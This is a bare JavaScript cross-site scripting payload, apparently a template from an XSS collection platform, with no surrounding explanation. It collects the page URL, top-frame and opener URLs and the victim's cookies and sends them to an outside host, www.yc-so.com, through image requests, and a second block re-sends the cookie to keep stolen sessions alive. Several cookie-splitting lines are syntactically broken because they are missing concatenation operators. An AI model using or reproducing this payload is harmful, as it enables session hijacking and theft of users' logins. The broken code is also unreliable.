(function() {
    (new Image()).src = 'http://www.yc-so.com/xser/s.php?do=api&id={projectId}&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&cookie=' + escape((function() {
        try {

            var c1=document.cookie;
            var c2=c1.split(";")[0]+";"c1.split(";")[1]+";"c1.split(";")[2]+";"c1.split(";")[3]+";"c1.split(";")[4]+";"c1.split(";")[5]+";"c1.split(";")[6]+";"c1.split(";")[7];
            var c3=c1.split(";")[8]+";"c1.split(";")[9]+";"c1.split(";")[10]+";"c1.split(";")[11]+";"c1.split(";")[12]+";"c1.split(";")[13]+";"c1.split(";")[14]+";"c1.split(";")[15];
            var c4=c1.split(";")[16]+";"c1.split(";")[17]+";"c1.split(";")[18]+";"c1.split(";")[19]+";"c1.split(";")[20]+";"c1.split(";")[21]+";"c1.split(";")[22]+";"c1.split(";")[23];
            return c2;
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();

if ('{set.keepsession}' == 1) {
    keep = new Image();
    keep.src = 'http://www.yc-so.com/xser/s.php?do=keepsession&id={projectId}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};

